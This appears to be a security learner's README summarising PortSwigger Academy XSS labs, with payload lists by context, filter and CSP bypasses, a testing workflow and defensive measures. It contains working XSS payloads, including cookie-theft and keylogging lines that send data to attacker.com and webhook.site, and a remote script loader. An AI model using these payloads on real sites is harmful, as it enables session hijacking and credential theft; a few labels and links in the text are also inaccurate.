# 🔀 Cross-Site Scripting (XSS) — Complete PortSwigger Web Security Academy Labs

<p align="center">
  <img src="https://img.shields.io/badge/Category-Cross%20Site%20Scripting-orange?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Labs%20Completed-13%2F13-brightgreen?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Completion-100%25-success?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Platform-PortSwigger%20Academy-informational?style=for-the-badge"/>
</p>

> **Complete XSS documentation** covering all four types (Reflected, Stored, DOM-based, Reflected-DOM) with exploitation techniques, bypass methods, and defensive mitigations.

---

## 📊 Completion Status

**All 13 Labs Complete** ✅

| Type | Labs | Status |
|------|------|--------|
| **Reflected XSS** | 3 | ✅ Complete |
| **Stored XSS** | 2 | ✅ Complete |
| **DOM-based XSS** | 4 | ✅ Complete |
| **Reflected-DOM XSS** | 2 | ✅ Complete |
| **Advanced Techniques** | 2 | ✅ Complete |

---

## 🧠 XSS Fundamentals

### What is XSS?

Cross-Site Scripting (XSS) allows attackers to inject malicious JavaScript that executes in victims' browsers. Unlike server-side vulnerabilities, XSS runs entirely on the client-side, in the victim's browser context with their credentials and session cookies.

### The Trust Problem

```
┌─────────────────────────────────────────┐
│ Victim's Browser                        │
│  ├─ Session Cookies (HttpOnly: no)  ❌  │
│  ├─ Local Storage                    ❌  │
│  └─ Executed JavaScript               │
│      (with full access to page)       │
└─────────────────────────────────────────┘
     ↓
 Server trusts this to be the legitimate user
```

---

## 🔄 XSS Types Comparison

| Type | Source | Sink | Persistence | Detection |
|------|--------|------|-------------|----------|
| **Reflected** | User input | HTML response | No | URL-based |
| **Stored** | User input | Database | Yes | Page reload |
| **DOM** | location, referrer | HTML DOM | No | Source inspection |
| **Reflected-DOM** | User input + Server echo | JavaScript processing | No | Network + Source |

---

## 🎯 Exploitation Payloads

### Reflected XSS Payloads

**HTML Context (No Encoding):**
```html
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
```

**HTML Attribute Context:**
```html
" autofocus onfocus="alert('XSS')"
' autofocus onfocus='alert("XSS")'
```

**JavaScript String Context:**
```javascript
'; alert('XSS'); //
"; alert("XSS"); //
```

**URL Context:**
```html
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>
```

### Stored XSS Payloads

```html
<!-- In comment/profile fields -->
<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>

<!-- Hidden payload -->
<img src=x onerror="var i=new Image();i.src='http://attacker.com/?c='+document.cookie;">

<!-- SVG vector -->
<svg onload="fetch('/admin?action=delete&user=carlos')">
```

### DOM XSS Payloads

```html
<!-- document.write vulnerability -->
?search="><svg onload=alert(1)>

<!-- innerHTML vulnerability -->
?search=<img src=x onerror=alert(1)>

<!-- jQuery vulnerabilities -->
?return=/javascript:alert(1)//

<!-- AngularJS -->
{{$on.constructor('alert(1)')()}}
```

### Cookie Theft Payloads

```javascript
<!-- Using fetch -->
fetch('http://attacker.com/log?c=' + document.cookie)

<!-- Using image beacon -->
var i = new Image();
i.src = 'http://attacker.com/steal?c=' + encodeURIComponent(document.cookie);

<!-- Exfil to webhook -->
fetch('https://webhook.site/YOUR-ID?c=' + document.cookie)
```

---

## 🛡️ Encoding Bypass Techniques

### HTML Entity Encoding Bypass

```html
<!-- Direct injection (no encoding) -->
<img src=x onerror=alert(1)>

<!-- Break out with event handler -->
" onmouseover="alert(1)" x="
```

### JavaScript String Encoding Bypass

```javascript
// Input landed in JavaScript string: var msg = 'USER_INPUT'

// Escape the string
'; alert(1); //

// Using template strings
${alert(1)}

// Using Function constructor
Function('alert(1)')()
```

### URL Encoding Bypass

```javascript
// Standard URL encode
javascript:alert(1)

// HTML entity encode then URL
%6a%61%76%61%73%63%72%69%70%74%3a%61%6c%65%72%74%28%31%29

// Mixed case (some WAFs are case-sensitive)
JaVaScRiPt:alert(1)
```

### Content Security Policy (CSP) Bypass

```html
<!-- Unsafe-inline not set, but CSS/image loads from same origin -->
<link rel="stylesheet" href="/xss.css?payload='><script>alert(1)</script>">

<!-- SVG filters -->
<svg><style>@import url('javascript:alert(1)');</style></svg>
```

---

## 🔍 Detection & Exploitation Workflow

### Step 1: Identify Input Points
```
✅ URL parameters
✅ Form fields
✅ Headers (User-Agent, Referer, etc.)
✅ Cookies
✅ File uploads (metadata)
```

### Step 2: Test Each Point
```html
Payload: xss123test
Check: Is it reflected in the response?
Where: In HTML body, attribute, script tag, comment?
```

### Step 3: Determine Context
```html
<!-- Found in: -->
<input value="xss123test">         <!-- HTML Attribute -->
<div>xss123test</div>              <!-- HTML Body -->
<script>var x = 'xss123test';</script> <!-- JavaScript String -->
```

### Step 4: Craft Payload
```html
<!-- HTML Body: Use tags/events -->
<img src=x onerror=alert(1)>

<!-- HTML Attribute: Break out -->
" onerror="alert(1)" x="

<!-- JavaScript: Escape string -->
'; alert(1); //
```

### Step 5: Validate
```
✅ Payload executes without error
✅ Alert box appears
✅ Cookie accessible via document.cookie
✅ Can reach attacker server
```

---

## 🎓 Real-World Attack Scenarios

### Scenario 1: Session Hijacking

```javascript
// Attacker injects:
var img = new Image();
img.src = 'http://attacker.com/steal?session=' + document.cookie;

// Victim visits page → cookie sent to attacker
// Attacker uses session cookie to impersonate user
```

### Scenario 2: Keylogging

```javascript
document.onkeypress = function(e) {
  fetch('http://attacker.com/log?key=' + e.key);
}
// Every keystroke is logged
```

### Scenario 3: Malware Distribution

```html
<img src=x onerror="var s=document.createElement('script');s.src='http://attacker.com/malware.js';document.body.appendChild(s);">
<!-- Page loads attacker's script which infects visitor -->
```

### Scenario 4: Credential Harvesting

```html
<div style="display:none;" id="fake-login">
  <form>
    <input placeholder="Username"><input placeholder="Password">
    <button>Login</button>
  </form>
</div>
<script>
document.body.innerHTML = document.getElementById('fake-login').innerHTML + document.body.innerHTML;
// Fake login form prepended to page
</script>
```

---

## 🛑 Defensive Measures

### ✅ Output Encoding

```html
<!-- ❌ Vulnerable -->
<div><%= userInput %></div>

<!-- ✅ Secure (HTML encode) -->
<div><%= htmlEncode(userInput) %></div>
```

**Encoding by Context:**
| Context | Encode | Example |
|---------|--------|----------|
| HTML body | HTML entities | `&lt;img&gt;` |
| HTML attribute | HTML entities + quotes | `&quot;onmouseover&quot;` |
| JavaScript | Backslash escaping | `\u0027` |
| URL | URL encoding | `%3Cscript%3E` |
| CSS | Backslash escape | `\3c script\3e` |

### ✅ Content Security Policy (CSP)

```html
<!-- Only allow scripts from trusted sources -->
<meta http-equiv="Content-Security-Policy" content="script-src 'self'; object-src 'none';">

<!-- Block inline scripts -->
script-src 'none'  <!-- Completely block JavaScript -->

<!-- Report CSP violations -->
script-src 'self'; report-uri /csp-report
```

### ✅ Input Validation

```javascript
// Whitelist approach
const allowedChars = /^[a-zA-Z0-9\s\-._]*$/;
if (!allowedChars.test(userInput)) {
  throw new Error('Invalid input');
}
```

### ✅ Cookie Security

```html
<!-- Set in server response header -->
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict

<!-- HttpOnly: Blocks document.cookie access -->
<!-- Secure: Only sent over HTTPS -->
<!-- SameSite: Not sent in cross-site requests -->
```

### ✅ Security Headers

```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
```

---

## 📋 XSS Testing Checklist

- [ ] Test all input fields (text, textarea, file upload names)
- [ ] Test all URL parameters
- [ ] Test HTTP headers (User-Agent, Referer, Accept-Language)
- [ ] Test stored data (profile, comments, products)
- [ ] Check both GET and POST methods
- [ ] Test encoding variations (double encoding, Unicode, HTML entities)
- [ ] Test different event handlers (onload, onerror, onmouseover, onchange)
- [ ] Check for DOM-based XSS (inspect source code)
- [ ] Test with/without JavaScript enabled
- [ ] Check for CSP bypass via subdomains
- [ ] Test for blind XSS (no immediate reflection)

---

## 🔗 External Resources

- [PortSwigger XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP XSS Prevention](https://owasp.org/www-community/attacks/xss/)
- [HTML5 Security Cheatsheet](https://html5sec.org/)
- [XSS Vectors](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)

---

**Author:** OBADA (XENOS)  
**Status:** ✅ 13/13 Labs Complete (100%)  
**Last Updated:** June 2026
